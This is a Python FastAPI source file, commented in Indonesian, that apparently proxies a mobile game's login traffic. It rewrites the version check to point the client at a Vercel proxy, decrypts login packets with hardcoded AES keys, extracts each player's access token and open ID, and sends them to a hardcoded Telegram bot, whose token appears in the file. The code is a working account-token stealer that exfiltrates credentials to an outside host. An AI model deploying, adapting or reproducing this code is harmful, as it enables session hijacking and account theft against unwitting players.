import os
import json
import sys
import traceback
import httpx
import requests
from fastapi import FastAPI, Request
from fastapi.responses import JSONResponse, Response
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad

# ========== COBA IMPOR PROTOBUF DECODER ==========
try:
    from protobuf_decoder.protobuf_decoder import Parser, FixedBitsValue
    PROTOBUF_AVAILABLE = True
    print("[OK] protobuf_decoder imported")
except ImportError:
    PROTOBUF_AVAILABLE = False
    print("[WARN] protobuf_decoder not found, using fallback parser")

# ========== FUNGSI DARI X7M (digabung) ==========

def decrypt_api(cipher_text):
    try:
        key = bytes([89, 103, 38, 116, 99, 37, 68, 69, 117, 104, 54, 37, 90, 99, 94, 56])
        iv = bytes([54, 111, 121, 90, 68, 114, 50, 50, 69, 51, 121, 99, 104, 106, 77, 37])
        cipher = AES.new(key, AES.MODE_CBC, iv)
        plain_text = unpad(cipher.decrypt(bytes.fromhex(cipher_text)), AES.block_size)
        return plain_text.hex()
    except Exception as e:
        print(f"[ERROR] decrypt_api: {e}")
        return None

def encrypt_api(plain_text):
    try:
        plain_text = bytes.fromhex(plain_text)
        key = bytes([89, 103, 38, 116, 99, 37, 68, 69, 117, 104, 54, 37, 90, 99, 94, 56])
        iv = bytes([54, 111, 121, 90, 68, 114, 50, 50, 69, 51, 121, 99, 104, 106, 77, 37])
        cipher = AES.new(key, AES.MODE_CBC, iv)
        cipher_text = cipher.encrypt(pad(plain_text, AES.block_size))
        return cipher_text.hex()
    except Exception as e:
        print(f"[ERROR] encrypt_api: {e}")
        return None

def encrypt_packet(plain_text, key, iv):
    try:
        plain_text = bytes.fromhex(plain_text)
        cipher = AES.new(key, AES.MODE_CBC, iv)
        cipher_text = cipher.encrypt(pad(plain_text, AES.block_size))
        return cipher_text.hex()
    except Exception as e:
        print(f"[ERROR] encrypt_packet: {e}")
        return None

# Fungsi parse_results dan make_serializable menggunakan Parser jika tersedia
if PROTOBUF_AVAILABLE:
    def parse_results(parsed_results):
        result_dict = {}
        for result in parsed_results:
            if result.field not in result_dict:
                result_dict[result.field] = []
            if result.wire_type in ("varint", "string", "bytes"):
                field_data = result.data
            elif result.wire_type == "length_delimited":
                field_data = parse_results(result.data.results)
            else:
                field_data = result.data
            result_dict[result.field].append(field_data)
        return {k: v[0] if len(v) == 1 else v for k, v in result_dict.items()}

    def make_serializable(obj):
        if isinstance(obj, (str, int, float, bool)) or obj is None:
            return obj
        if isinstance(obj, (bytes, bytearray)):
            return obj.hex()
        if isinstance(obj, FixedBitsValue):
            if hasattr(obj, "value"):
                return obj.value
            elif hasattr(obj, "data"):
                return obj.data
            else:
                return str(obj)
        if isinstance(obj, dict):
            return {k: make_serializable(v) for k, v in obj.items()}
        if isinstance(obj, (list, tuple)):
            return [make_serializable(v) for v in obj]
        return str(obj)

    def get_available_room(_text):
        try:
            parsed_results = Parser().parse(_text)
            parsed_results_dict = parse_results(parsed_results)
            clean = make_serializable(parsed_results_dict)
            return json.dumps(clean)
        except Exception as e:
            print(f"[ERROR] get_available_room: {e}")
            return '{"29": "dummy", "22": "dummy"}'

    def proto_json(hex_string):
        try:
            parsed = Parser().parse(hex_string)
            parsed_dict = parse_results(parsed)
            clean = make_serializable(parsed_dict)
            return json.dumps(clean, ensure_ascii=False, indent=1)
        except Exception as e:
            print(f"[ERROR] proto_json: {e}")
            return '{}'

else:
    # Fallback jika protobuf_decoder tidak ada
    def get_available_room(_text):
        # Coba parse sederhana: ambil field 29 dan 22 jika ada dalam teks (misal JSON)
        try:
            # Asumsikan _text adalah string yang mungkin JSON atau protobuf hex? kita coba parsing sebagai JSON
            data = json.loads(_text)
            # Jika berhasil, ambil 29 dan 22
            result = {}
            if "29" in data:
                result["29"] = data["29"]
            else:
                result["29"] = "dummy"
            if "22" in data:
                result["22"] = data["22"]
            else:
                result["22"] = "dummy"
            return json.dumps(result)
        except:
            # Jika gagal, coba cari pola "29" dan "22" dengan regex? Atau return dummy
            # Kita bisa coba asumsikan teks adalah hex dari protobuf, kita decode sederhana?
            # Karena tidak punya parser, kita return dummy
            return '{"29": "dummy", "22": "dummy"}'

    def proto_json(hex_string):
        return '{}'

    def parse_results(parsed_results):
        return {}

    def make_serializable(obj):
        return obj

# ========== FUNGSI TAMBAHAN DARI X7M (tidak digunakan langsung) ==========
def EnC_Vr(N):
    if N < 0: return b''
    H = []
    while True:
        BesTo = N & 0x7F
        N >>= 7
        if N:
            BesTo |= 0x80
        H.append(BesTo)
        if not N:
            break
    return bytes(H)

def DEc_Uid(H):
    n = s = 0
    for b in bytes.fromhex(H):
        n |= (b & 0x7F) << s
        if not (b & 0x80):
            break
        s += 7
    return n

def CrEaTe_VarianT(field_number, value):
    field_header = (field_number << 3) | 0
    return EnC_Vr(field_header) + EnC_Vr(value)

def CrEaTe_LenGTh(field_number, value):
    field_header = (field_number << 3) | 2
    encoded_value = value.encode() if isinstance(value, str) else value
    return EnC_Vr(field_header) + EnC_Vr(len(encoded_value)) + encoded_value

def CrEaTe_ProTo(fields):
    packet = bytearray()
    for field, value in fields.items():
        if isinstance(value, dict):
            nested_packet = CrEaTe_ProTo(value)
            packet.extend(CrEaTe_LenGTh(field, nested_packet))
        elif isinstance(value, int):
            packet.extend(CrEaTe_VarianT(field, value))
        elif isinstance(value, str) or isinstance(value, bytes):
            packet.extend(CrEaTe_LenGTh(field, value))
    return packet

def dec_aes(c):
    try:
        c = bytes.fromhex(c.replace(" ", ""))
        key = b'Yg&tc%DEuh6%Zc^8'
        iv = b'6oyZDr22E3ychjM%'
        cipher = AES.new(key, AES.MODE_CBC, iv)
        decrypted = unpad(cipher.decrypt(c), AES.block_size).hex()
        return decrypted
    except Exception as e:
        print(f"[ERROR] dec_aes: {e}")
        return None

def NorMaLizE_ProTo(obj):
    if isinstance(obj, dict):
        new_dict = {}
        for k, v in obj.items():
            new_key = int(k)
            new_dict[new_key] = NorMaLizE_ProTo(v)
        return new_dict
    elif isinstance(obj, list):
        return [NorMaLizE_ProTo(i) for i in obj]
    else:
        return obj

def Fix_PackeT(parsed_results):
    Pk = {}
    for result in parsed_results:
        field_data = {}
        field_data['wire_type'] = result.wire_type
        if result.wire_type == "varint":
            field_data['data'] = result.data
        if result.wire_type == "string":
            field_data['data'] = result.data
        if result.wire_type == "bytes":
            field_data['data'] = result.data
        elif result.wire_type == 'length_delimited':
            field_data["data"] = Fix_PackeT(result.data.results)
        Pk[result.field] = field_data
    return Pk

def DeCode_PackeT(input_text):
    try:
        if not PROTOBUF_AVAILABLE:
            return None
        parsed_results = Parser().parse(input_text)
        parsed_results_objects = parsed_results
        parsed_results_dict = Fix_PackeT(parsed_results_objects)
        json_data = json.dumps(parsed_results_dict)
        return json_data
    except Exception as e:
        print(f"error {e}")
        return None

# ========== FASTAPI APP ==========
app = FastAPI()

# ========== TOKEN & CHAT ID (hardcoded) ==========
TOKEN = "8822285495:AAHLYHZDWqT6TspWuBGxYfZkxnnGl5furuw"
CHAT_ID = "6513583182"

# ========== MIDDLEWARE GLOBAL ERROR HANDLER ==========
@app.middleware("http")
async def catch_errors(request: Request, call_next):
    try:
        return await call_next(request)
    except Exception as e:
        print(f"[GLOBAL ERROR] {e}")
        traceback.print_exc()
        return JSONResponse(
            status_code=500,
            content={"error": "Internal Server Error", "detail": str(e)}
        )

# ========== ENDPOINT /ver.php ==========
@app.api_route("/ver.php", methods=["GET", "POST"])
async def manual(request: Request):
    try:
        target = "https://version.ggwhitehawk.com/live/ver.php"
        headers = {
            k: v for k, v in request.headers.items()
            if k.lower() not in ("host", "content-length", "connection")
        }
        async with httpx.AsyncClient(follow_redirects=True) as client:
            r = await client.request(
                request.method,
                target,
                params=dict(request.query_params),
                headers=headers,
                content=await request.body()
            )
        data = r.json()
        # Ganti dengan domain Vercel Anda
        data["server_url"] = "https://proxy-cgu.vercel.app"

        HOP_BY_HOP = {'transfer-encoding', 'connection', 'keep-alive', 'proxy-authenticate',
                      'proxy-authorization', 'te', 'trailers', 'upgrade', 'proxy-connection'}
        response_headers = {
            k: v for k, v in r.headers.items()
            if k.lower() not in HOP_BY_HOP and k.lower() not in ("content-length", "content-encoding")
        }
        return JSONResponse(content=data, status_code=r.status_code, headers=response_headers)
    except Exception as e:
        print(f"[ERROR] /ver.php: {e}")
        traceback.print_exc()
        return JSONResponse(content={"error": str(e)}, status_code=500)

# ========== ENDPOINT /MajorLogin ==========
@app.api_route("/MajorLogin", methods=["POST"])
async def MajorLoginProxy(request: Request):
    try:
        print("[INFO] MajorLogin called")
        body = await request.body()
        if not body:
            return Response(content="Empty body", status_code=400)

        hex_data = body.hex()
        print(f"[DEBUG] hex: {hex_data[:100]}...")

        decrypted_hex = decrypt_api(hex_data)
        if decrypted_hex is None:
            print("[ERROR] decrypt_api failed")
            return Response(content="{}", status_code=500, media_type="application/octet-stream")

        # decrypted_hex adalah hex string dari plaintext protobuf
        # Kita perlu mendapatkan field 29 dan 22
        room_data = get_available_room(decrypted_hex)
        try:
            parsed = json.loads(room_data)
        except:
            parsed = {"29": "dummy", "22": "dummy"}

        acess_token = parsed.get("29", "dummy")
        open_id = parsed.get("22", "dummy")
        print(f"[INFO] Token: {acess_token}, OpenID: {open_id}")

        # Kirim ke Telegram
        if acess_token and open_id:
            try:
                ff = f"""Access Token : {acess_token} .
Open_id : {open_id} .

By : CONVERTGAMINGUID
CGU PROXY."""
                r = requests.post(
                    f'https://api.telegram.org/bot{TOKEN}/sendMessage',
                    params={'chat_id': CHAT_ID, 'text': ff}
                )
                if r.status_code == 200:
                    print('[OK] Sent to Telegram')
                else:
                    print(f'[WARN] Telegram send failed: {r.status_code}')
            except Exception as e:
                print(f"[ERROR] Telegram: {e}")

        # Respons yang diharapkan game (status 500)
        nikomLhnoud = f""" [b][c][279CF5]














─────────────────────────────────────

[cccccc]access Token => [ff0000]{acess_token} [cccccc]| open id => [00ff00]{open_id}

[00ff00] CONVERTGAMINGUID




















                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    """
        return Response(content=nikomLhnoud, status_code=500, media_type="application/octet-stream")

    except Exception as e:
        print(f"[ERROR] MajorLogin: {e}")
        traceback.print_exc()
        # Selalu balik respons agar tidak crash
        return Response(content="{}", status_code=500, media_type="application/octet-stream")

# ========== UNTUK LOCAL TESTING ==========
if __name__ == "__main__":
    import uvicorn
    uvicorn.run(app, host="0.0.0.0", port=6677)
